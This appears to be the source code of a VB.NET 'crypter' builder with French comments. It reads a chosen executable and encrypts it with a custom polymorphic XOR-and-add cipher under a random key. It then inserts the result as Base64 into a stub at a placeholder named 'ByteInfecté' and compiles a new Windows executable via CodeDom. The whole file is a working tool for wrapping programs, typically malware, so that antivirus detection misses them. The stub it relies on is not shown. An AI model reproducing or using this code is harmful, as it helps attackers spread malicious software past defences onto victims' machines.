Imports System.Text
Imports System.CodeDom.Compiler

Public Class Form1
    'Algorithm de Cryptage
    Public Class PolyMorphicStairs
        Overloads Shared Function PolyCrypt(ByRef Data() As Byte, ByVal Key() As Byte, Optional ByVal ExtraRounds As UInteger = 0) As Byte()
            Array.Resize(Data, Data.Length + 1)
            Data(Data.Length - 1) = Convert.ToByte(New Random().Next(1, 255))
            For i As Integer = (Data.Length - 1) * (ExtraRounds + 1) To 0 Step -1
                Data(i Mod Data.Length) = CByte(CInt((Data(i Mod Data.Length)) + CInt(Data((i + 1) Mod Data.Length))) Mod 256) Xor Key(i Mod Key.Length)
            Next
            Return Data
        End Function
        Overloads Shared Function PolyDeCrypt(ByRef Data() As Byte, ByVal Key() As Byte, Optional ByVal ExtraRounds As UInteger = 0) As Byte()
            For i As Integer = 0 To (Data.Length - 1) * (ExtraRounds + 1)
                Data(i Mod Data.Length) = CByte((CInt(Data(i Mod Data.Length) Xor Key(i Mod Key.Length)) - CInt(Data((i + 1) Mod Data.Length)) + 256) Mod 256)
            Next
            Array.Resize(Data, Data.Length - 1)
            Return Data
        End Function
    End Class

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        'Declaration d'un OpenFiledialog
        Dim ofd As New OpenFileDialog
        With ofd
            ofd.DefaultExt = "exe"
            ofd.Filter = "Executable Files (*.exe)|*.exe"
            ofd.FilterIndex = 1
            ofd.FileName = ""
            If ofd.ShowDialog(Me) = 1 Then
                Try
                    TextBox1.Text = ofd.FileName
                Catch
                End Try
            End If
        End With
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        If IO.File.Exists(TextBox1.Text) = False Then
            MsgBox("Select a Valid File")
            Exit Sub
        End If
        'Declaration d'un SaveFileDialog
        Dim dialog As New SaveFileDialog
        'Declaration du Stub des Ressource & d'une Clé Aléatoire
        Dim mykey As String = random_key(100)
        Dim yourstub As String = My.Resources.Stub
        Dim F As String

        'Lis votre Byte Et l'encrypt grace a l'algorithm de Cryptage
        Dim Bytesto_Encrypt As Byte() = PolyMorphicStairs.PolyCrypt(IO.File.ReadAllBytes(TextBox1.Text), Encoding.GetEncoding(1250).GetBytes(mykey))

        'Ajout du Byte dans le Stub & remplacement de le Clé
        yourstub = yourstub.Replace("ByteInfecté", Format(Bytesto_Encrypt))
        yourstub = yourstub.Replace("LaCléRemplacerIci", mykey)
        With dialog
            dialog.DefaultExt = "exe"
            dialog.Filter = "Executable Files (*.exe)|*.exe"
            dialog.FilterIndex = 1
            dialog.FileName = ""
            If dialog.ShowDialog(Me) = 1 Then
                Try
                    F = dialog.FileName
                    Button2.Enabled = True
                Catch
                End Try
            End If
        End With
        Codedom.Compile(dialog.FileName, yourstub, "")

        MsgBox("Voila !")
    End Sub
#Region "Convertion du Byte en String (Base64)"
    Private Shared Function SplitString(ByVal F As String, ByVal G As Long) As String()
        Dim A As Long = Math.Ceiling(F.Length / G)
        Dim B(A - 1) As String
        Dim C As Long = 0
        For D As Integer = 0 To A - 1
            If D = A - 1 Then
                Dim E((F.Length - C) - 1) As Char
                F.CopyTo(C, E, 0, (F.Length - C))
                B(D) = Convert.ToString(E)
            Else
                Dim E(G - 1) As Char
                F.CopyTo(C, E, 0, G)
                B(D) = Convert.ToString(E)
                C += G
            End If
        Next
        Return B
    End Function
    Public Shared Function Format(ByVal E As Byte()) As String
        Dim A As New System.Text.StringBuilder
        Dim B As String = Convert.ToBase64String(E)
        Dim C As String() = SplitString(B, 10)
        For D As Integer = 0 To C.Length - 1
            If D = C.Length - 1 Then
                A.Append(Chr(34) & C(D) & Chr(34))
            Else
                A.Append(Chr(34) & C(D) & Chr(34) & " & _" & vbNewLine)
            End If
        Next
        Return A.ToString
    End Function
#End Region
#Region "Generation d'une Clé Aléatoire"
    Public Shared Function random_key(ByVal lenght As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 1 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
#End Region
End Class
#Region "Codedom Compiler Pour Generez Votre Executable"
Public Class Codedom
    Public Shared Sub Compile(ByVal Output As String, ByVal Source As String, ByVal Icon As String)
        On Error Resume Next
        Dim Compiler As ICodeCompiler = (New VBCodeProvider).CreateCompiler()
        Dim Parameters As New CompilerParameters()
        Dim cResults As CompilerResults
        Parameters.GenerateExecutable = True
        Parameters.OutputAssembly = Output
        Parameters.CompilerOptions = "/target:winexe"
        Parameters.ReferencedAssemblies.Add("System.dll")
        Parameters.ReferencedAssemblies.Add("System.Data.dll")
        Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll")
        Dim FASFASFFF = New Dictionary(Of String, String)
        FASFASFFF.Add("CompilerVersion", "v2.0")
        Parameters.CompilerOptions = "/filealign:0x00000200 /optimize+ /platform:X86 /debug- /target:winexe"
        Dim ADAS432RAS As String = IO.Path.GetTempPath & "\iCompiler.ico"
        If Icon <> "" Then
            IO.File.Copy(Icon, ADAS432RAS)
            Parameters.CompilerOptions &= " /win32icon:" & ADAS432RAS
        End If
        cResults = Compiler.CompileAssemblyFromSource(Parameters, Source)
        If cResults.Errors.Count > 0 Then
            For Each CompilerError In cResults.Errors
                'MsgBox("LookUp Status Error")
                MessageBox.Show("Error: " & CompilerError.ErrorText, "", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Next
        ElseIf cResults.Errors.Count = 0 Then
        End If
        If Icon <> "" Then : IO.File.Delete(ADAS432RAS) : End If
        'To Delete Resource File After Use
    End Sub
End Class
#End Region
